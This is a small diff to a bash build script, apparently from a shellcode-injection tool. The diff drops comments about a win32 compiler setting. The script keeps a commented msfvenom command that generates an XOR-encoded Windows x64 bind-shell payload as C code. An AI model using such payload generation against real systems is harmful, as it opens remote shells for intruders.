@@ -1,8 +1,5 @@
 #!/bin/bash          
 # example script for injecting shellcode into a process
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
 . build/global_win64.sh
 # payload 
 #msfvenom -p windows/x64/shell/bind_tcp -e x64/xor -f c --platform Windows > sc.txt
